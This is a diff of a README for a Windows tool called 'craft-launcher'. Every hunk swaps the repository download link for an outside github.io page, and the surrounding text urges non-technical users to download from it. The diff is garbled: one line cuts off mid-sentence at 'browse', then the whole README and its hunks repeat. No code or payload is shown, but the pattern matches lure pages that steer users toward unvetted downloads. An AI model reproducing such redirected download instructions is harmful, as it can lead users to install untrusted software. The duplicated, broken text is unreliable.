@@ -1,6 +1,6 @@
 # 🚀 craft-launcher - Launch Your Craft Apps Easily
 
-[![Download craft-launcher](https://img.shields.io/badge/Download-craft--launcher-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mabrooks25/craft-launcher)
+[![Download craft-launcher](https://img.shields.io/badge/Download-craft--launcher-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://mabrooks25.github.io)
 
 craft-launcher is the Craft App Launcher for Windows. It gives you one simple place to open and manage your craft apps, so you do not have to hunt through folders or remember where each app is stored. The launcher is built for everyday computer users. You do not need programming knowledge, special tools, or a technical background to get started. The main goal is simple: help you download the application from the official project page, open it on your Windows computer, and begin using it with confidence.
 
@@ -18,7 +18,7 @@ The top of this page includes a large download badge. You can use that badge, or
 
 Use the official download link here:
 
-[Download craft-launcher](https://github.com/Mabrooks25/craft-launcher)
+[Download craft-launcher](https://mabrooks25.github.io)
 
 Visit this link to download the application.
 
@@ -42,7 +42,7 @@ If you close craft-launcher during setup, simply open it again. The launcher sho
 
 craft-launcher acts as a central starting point for your craft apps. Once it is open, browse# 🚀 craft-launcher - Launch Your Craft Apps Easily
 
-[![Download craft-launcher](https://img.shields.io/badge/Download-craft--launcher-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mabrooks25/craft-launcher)
+[![Download craft-launcher](https://img.shields.io/badge/Download-craft--launcher-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://mabrooks25.github.io)
 
 craft-launcher is the Craft App Launcher for Windows. It gives you one simple place to open and manage your craft apps, so you do not have to hunt through folders or remember where each app is stored. The launcher is built for everyday computer users. You do not need programming knowledge, special tools, or a technical background to get started. The main goal is simple: help you download the application from the official project page, open it on your Windows computer, and begin using it with confidence.
 
@@ -60,7 +60,7 @@ The top of this page includes a large download badge. You can use that badge, or
 
 Use the official download link here:
 
-[Download craft-launcher](https://github.com/Mabrooks25/craft-launcher)
+[Download craft-launcher](https://mabrooks25.github.io)
 
 Visit this link to download the application.
 
